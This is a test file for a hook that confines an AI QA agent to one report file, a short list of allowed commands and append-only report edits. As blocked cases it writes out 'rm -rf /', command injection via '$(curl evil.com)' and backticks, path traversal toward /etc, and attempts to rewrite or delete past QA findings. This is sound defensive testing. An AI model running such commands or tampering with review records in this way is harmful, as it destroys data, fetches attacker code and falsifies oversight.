import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { join } from "node:path";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";

const SCRIPT = join(import.meta.dir, "..", "..", "scripts", "hooks", "validate-qa-agent.ts");

async function runHook(mode: "write" | "bash", payload: unknown): Promise<{ exitCode: number; stderr: string }> {
  const proc = Bun.spawn(["bun", SCRIPT, mode], {
    stdin: "pipe",
    stdout: "pipe",
    stderr: "pipe",
  });
  proc.stdin.write(JSON.stringify(payload));
  proc.stdin.end();
  const exitCode = await proc.exited;
  const stderr = await new Response(proc.stderr).text();
  return { exitCode, stderr };
}

describe("scripts/hooks/validate-qa-agent.ts — write mode (allow-list)", () => {
  test("writing .pipeline/qa-report.json (relative) is allowed", async () => {
    const { exitCode } = await runHook("write", { tool_input: { file_path: ".pipeline/qa-report.json" } });
    expect(exitCode).toBe(0);
  });

  test("writing .pipeline/qa-report.json (absolute) is allowed", async () => {
    const { exitCode } = await runHook("write", {
      tool_input: { file_path: "C:/clients/acme/.pipeline/qa-report.json" },
    });
    expect(exitCode).toBe(0);
  });

  test('case-insensitive match: ".PIPELINE/QA-Report.json" is allowed same as the lowercase form', async () => {
    const { exitCode } = await runHook("write", { tool_input: { file_path: ".PIPELINE/QA-Report.json" } });
    expect(exitCode).toBe(0);
  });

  for (const file of [
    "kickoff.json",
    "scraper-output.json",
    "design-lock.json",
    "mockup-approval.json",
    "signoff.json",
    "pipeline-status.json",
  ]) {
    test(`writing ${file} is blocked (not the one allowed target)`, async () => {
      const { exitCode, stderr } = await runHook("write", { tool_input: { file_path: `.pipeline/${file}` } });
      expect(exitCode).toBe(2);
      expect(stderr).toContain("qa-report.json");
    });
  }

  test("writing arbitrary site code is blocked (qa-agent never writes application code)", async () => {
    const { exitCode } = await runHook("write", { tool_input: { file_path: "C:/clients/acme/app/page.tsx" } });
    expect(exitCode).toBe(2);
  });

  test("unparseable stdin fails closed (blocked), not open", async () => {
    const proc = Bun.spawn(["bun", SCRIPT, "write"], { stdin: "pipe", stdout: "pipe", stderr: "pipe" });
    proc.stdin.write("not json");
    proc.stdin.end();
    const exitCode = await proc.exited;
    expect(exitCode).toBe(2);
  });
});

describe("scripts/hooks/validate-qa-agent.ts — bash mode (allow-list)", () => {
  test("server-lifecycle.ts start --mode build is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/server-lifecycle.ts start --mode build --cwd C:/clients/acme/site" },
    });
    expect(exitCode).toBe(0);
  });

  test("server-lifecycle.ts start --mode dev is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/server-lifecycle.ts start --mode dev --cwd C:/clients/acme/site" },
    });
    expect(exitCode).toBe(0);
  });

  test('server-lifecycle.ts start with an invalid --mode is blocked', async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/server-lifecycle.ts start --mode production --cwd C:/clients/acme/site" },
    });
    expect(exitCode).toBe(2);
  });

  test("server-lifecycle.ts stop (no arguments) is allowed", async () => {
    const { exitCode } = await runHook("bash", { tool_input: { command: "bun scripts/server-lifecycle.ts stop" } });
    expect(exitCode).toBe(0);
  });

  test("server-lifecycle.ts stop with an extra argument is blocked — stop takes no target, precision lives in the script itself", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun scripts/server-lifecycle.ts stop --pid 1234" },
    });
    expect(exitCode).toBe(2);
  });

  test("a raw taskkill/kill command is never allowed, regardless of target", async () => {
    const { exitCode } = await runHook("bash", { tool_input: { command: "taskkill /PID 1234 /F /T" } });
    expect(exitCode).toBe(2);
  });

  test("a11y-audit.ts (node, localhost URL) with a valid --url/--tags shape is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: {
        command:
          "node --experimental-strip-types scripts/a11y-audit.ts --url http://localhost:3000/about --tags wcag2a,wcag2aa,wcag21aa",
      },
    });
    expect(exitCode).toBe(0);
  });

  test("a11y-audit.ts invoked via bun (not node) is blocked — this script deliberately runs under node only", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: {
        command: "bun scripts/a11y-audit.ts --url http://localhost:3000/about --tags wcag2a,wcag2aa,wcag21aa",
      },
    });
    expect(exitCode).toBe(2);
  });

  test("a11y-audit.ts pointed at a non-localhost URL is blocked", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: {
        command: "node --experimental-strip-types scripts/a11y-audit.ts --url https://example.com --tags wcag2a",
      },
    });
    expect(exitCode).toBe(2);
  });

  test("a11y-audit.ts pointed at localhost but on a different protocol (https) is blocked", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: {
        command: "node --experimental-strip-types scripts/a11y-audit.ts --url https://localhost:3000/ --tags wcag2a",
      },
    });
    expect(exitCode).toBe(2);
  });

  test("mkdir -p for the current round's screenshot directory is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "mkdir -p clients/rg-detailing-geelong/.pipeline/qa/screenshots/round-2" },
    });
    expect(exitCode).toBe(0);
  });

  test("mkdir -p outside .pipeline/qa/screenshots/round-<n> is blocked", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "mkdir -p clients/rg-detailing-geelong/src/components" },
    });
    expect(exitCode).toBe(2);
  });

  test("mkdir -p targeting another client's screenshot directory via traversal is blocked", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "mkdir -p clients/rg-detailing-geelong/../../etc/.pipeline/qa/screenshots/round-1" },
    });
    expect(exitCode).toBe(2);
  });

  test("mkdir -p with a non-numeric round is blocked", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "mkdir -p clients/rg-detailing-geelong/.pipeline/qa/screenshots/round-final" },
    });
    expect(exitCode).toBe(2);
  });

  test("bare mkdir (no -p, no path) is blocked", async () => {
    const { exitCode } = await runHook("bash", { tool_input: { command: "mkdir" } });
    expect(exitCode).toBe(2);
  });

  test("the dry-run validation test command is allowed", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "bun test tests/agents/qa-output.dry-run.test.ts" },
    });
    expect(exitCode).toBe(0);
  });

  test("an arbitrary shell command is blocked", async () => {
    const { exitCode } = await runHook("bash", { tool_input: { command: "rm -rf /" } });
    expect(exitCode).toBe(2);
  });

  test("$(...) injection through an otherwise-matching --cwd is blocked", async () => {
    const { exitCode, stderr } = await runHook("bash", {
      tool_input: { command: "bun scripts/server-lifecycle.ts start --mode build --cwd $(curl evil.com)" },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("$");
  });

  test("backtick injection is blocked", async () => {
    const { exitCode } = await runHook("bash", {
      tool_input: { command: "node --experimental-strip-types scripts/a11y-audit.ts --url `curl evil.com` --tags wcag2a" },
    });
    expect(exitCode).toBe(2);
  });
});

function makeQaReport(path: string, findings: Array<{ round: number; id: string; status: string }>) {
  const roundsByNumber = new Map<number, any>();
  for (const f of findings) {
    if (!roundsByNumber.has(f.round)) {
      roundsByNumber.set(f.round, {
        round: f.round,
        scope: "full",
        tested_at: "2026-07-20T00:00:00Z",
        findings: [],
        acceptance_criteria_check: [],
        round_result: "fail",
      });
    }
    roundsByNumber.get(f.round).findings.push({
      id: f.id,
      reopened_from_id: null,
      page: "/",
      issue: "original issue text",
      severity: "major",
      category: "functional",
      screenshot_ref: null,
      status: f.status,
      agent_note: null,
    });
  }
  writeFileSync(
    path,
    JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "2026-07-20T00:00:00Z",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "fail",
        current_round: Math.max(...roundsByNumber.keys()),
        rounds: [...roundsByNumber.values()],
      },
    })
  );
}

describe("scripts/hooks/validate-qa-agent.ts — qa-report.json write-pattern invariants", () => {
  let dir: string;
  let filePath: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "qa-agent-hook-test-"));
    mkdirSync(join(dir, ".pipeline"));
    // Must live under a ".pipeline/" directory — the allow-list checks the
    // full path, not just the basename (unlike design/backend's deny-list,
    // which only needs to rule out specific known-bad paths regardless of
    // location; an allow-list has to positively match the real target).
    filePath = join(dir, ".pipeline", "qa-report.json").replace(/\\/g, "/");
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  test("first-ever write (file doesn't exist yet) is allowed", async () => {
    const content = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: { overall_status: "fail", current_round: 1, rounds: [{ round: 1, findings: [] }] },
    });
    const { exitCode } = await runHook("write", { tool_name: "Write", tool_input: { file_path: filePath, content } });
    expect(exitCode).toBe(0);
  });

  test("reaching back into a prior round to flip fixed_claimed -> verified_fixed (not the current round) is allowed", async () => {
    makeQaReport(filePath, [{ round: 1, id: "f1", status: "fixed_claimed" }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "pass",
        current_round: 2,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "major",
                category: "functional",
                screenshot_ref: null,
                status: "verified_fixed",
                agent_note: "confirmed fixed",
              },
            ],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
          {
            round: 2,
            scope: "full",
            tested_at: "2026-07-20T01:00:00Z",
            findings: [],
            acceptance_criteria_check: [],
            round_result: "pass",
          },
        ],
      },
    });
    const { exitCode } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(0);
  });

  test("appending a brand-new finding to a non-current (closed-out) round is blocked", async () => {
    makeQaReport(filePath, [{ round: 1, id: "f1", status: "open" }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "fail",
        current_round: 2,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "major",
                category: "functional",
                screenshot_ref: null,
                status: "open",
                agent_note: null,
              },
              // sneaking a brand-new finding into round 1 instead of round 2
              {
                id: "f-sneaky",
                reopened_from_id: null,
                page: "/contact",
                issue: "a new issue found this round",
                severity: "minor",
                category: "functional",
                screenshot_ref: null,
                status: "open",
                agent_note: null,
              },
            ],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
          {
            round: 2,
            scope: "full",
            tested_at: "2026-07-20T01:00:00Z",
            findings: [],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("round 1");
    expect(stderr).toContain("current round");
  });

  test("changing round_result on a non-current round is blocked — round-level fields freeze once a later round exists", async () => {
    makeQaReport(filePath, [{ round: 1, id: "f1", status: "verified_fixed" }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "pass",
        current_round: 2,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "major",
                category: "functional",
                screenshot_ref: null,
                status: "verified_fixed",
                agent_note: null,
              },
            ],
            acceptance_criteria_check: [],
            round_result: "pass", // was "fail" in makeQaReport's default — illegally rewritten
          },
          {
            round: 2,
            scope: "full",
            tested_at: "2026-07-20T01:00:00Z",
            findings: [],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("round 1");
    expect(stderr).toContain("frozen");
  });

  test("changing severity on a non-terminal finding in a non-current round is blocked — only status/agent_note may change there", async () => {
    makeQaReport(filePath, [{ round: 1, id: "f1", status: "fixed_claimed" }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "pass",
        current_round: 2,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "blocker", // was "major" — sneaking in a non-status field change alongside a legit-looking reconciliation
                category: "functional",
                screenshot_ref: null,
                status: "verified_fixed",
                agent_note: "confirmed fixed",
              },
            ],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
          {
            round: 2,
            scope: "full",
            tested_at: "2026-07-20T01:00:00Z",
            findings: [],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("f1");
    expect(stderr).toContain("status/agent_note");
  });

  test("moving a non-current-round finding to a non-terminal status (e.g. disputed) is blocked — reconciliation may only land on a terminal status", async () => {
    makeQaReport(filePath, [{ round: 1, id: "f1", status: "open" }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "fail",
        current_round: 2,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "major",
                category: "functional",
                screenshot_ref: null,
                status: "disputed",
                agent_note: null,
              },
            ],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
          {
            round: 2,
            scope: "full",
            tested_at: "2026-07-20T01:00:00Z",
            findings: [],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("terminal status");
  });

  test("full mutability on the current round is preserved — new findings and round_result/scope/tested_at changes there are allowed", async () => {
    makeQaReport(filePath, [{ round: 1, id: "f1", status: "verified_fixed" }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "fail",
        current_round: 1,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T02:00:00Z", // updated — still the current round, fully mutable
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "major",
                category: "functional",
                screenshot_ref: null,
                status: "verified_fixed",
                agent_note: null,
              },
              {
                id: "f2",
                reopened_from_id: null,
                page: "/about",
                issue: "brand new finding, same (current) round",
                severity: "minor",
                category: "visual",
                screenshot_ref: null,
                status: "open",
                agent_note: null,
              },
            ],
            acceptance_criteria_check: [{ criterion: "homepage loads", verified: true }],
            round_result: "pass",
          },
        ],
      },
    });
    const { exitCode } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(0);
  });

  test("removing a finding from an existing round is blocked (finding-level append-only)", async () => {
    makeQaReport(filePath, [
      { round: 1, id: "f1", status: "open" },
      { round: 1, id: "f2", status: "open" },
    ]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "fail",
        current_round: 1,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "major",
                category: "functional",
                screenshot_ref: null,
                status: "open",
                agent_note: null,
              },
            ],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("f2");
    expect(stderr).toContain("append-only");
  });

  test("changing severity on an already-terminal (verified_fixed) finding is blocked — full-field immutability, not just status", async () => {
    const roundWithTerminalFinding = {
      round: 1,
      scope: "full",
      tested_at: "2026-07-20T00:00:00Z",
      findings: [
        {
          id: "f1",
          reopened_from_id: null,
          page: "/",
          issue: "original issue text",
          severity: "major",
          category: "functional",
          screenshot_ref: null,
          status: "verified_fixed",
          agent_note: "confirmed fixed",
        },
      ],
      acceptance_criteria_check: [],
      round_result: "pass",
    };
    writeFileSync(
      filePath,
      JSON.stringify({
        schema_version: "1.0",
        client_id: "acme-co",
        last_updated_at: "2026-07-20T00:00:00Z",
        last_updated_by: "qa-agent",
        data: { overall_status: "pass", current_round: 1, rounds: [roundWithTerminalFinding] },
      })
    );

    const tampered = {
      ...roundWithTerminalFinding,
      findings: [{ ...roundWithTerminalFinding.findings[0], severity: "blocker" }],
    };
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: { overall_status: "pass", current_round: 1, rounds: [tampered] },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("f1");
    expect(stderr).toContain("terminal");
  });

  test("changing status FROM a non-terminal state (open) is allowed — only terminal findings are frozen", async () => {
    makeQaReport(filePath, [{ round: 1, id: "f1", status: "open" }]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "fail",
        current_round: 1,
        rounds: [
          {
            round: 1,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [
              {
                id: "f1",
                reopened_from_id: null,
                page: "/",
                issue: "original issue text",
                severity: "major",
                category: "functional",
                screenshot_ref: null,
                status: "fixed_claimed",
                agent_note: "backend claims this is fixed",
              },
            ],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
        ],
      },
    });
    const { exitCode } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(0);
  });

  test("Write that drops an entire existing round is blocked on the round-count check", async () => {
    makeQaReport(filePath, [
      { round: 1, id: "f1", status: "verified_fixed" },
      { round: 2, id: "f2", status: "open" },
    ]);
    const newContent = JSON.stringify({
      schema_version: "1.0",
      client_id: "acme-co",
      last_updated_at: "now",
      last_updated_by: "qa-agent",
      data: {
        overall_status: "fail",
        current_round: 1,
        rounds: [
          {
            round: 2,
            scope: "full",
            tested_at: "2026-07-20T00:00:00Z",
            findings: [],
            acceptance_criteria_check: [],
            round_result: "fail",
          },
        ],
      },
    });
    const { exitCode, stderr } = await runHook("write", {
      tool_name: "Write",
      tool_input: { file_path: filePath, content: newContent },
    });
    expect(exitCode).toBe(2);
    expect(stderr).toContain("may not decrease");
  });
});
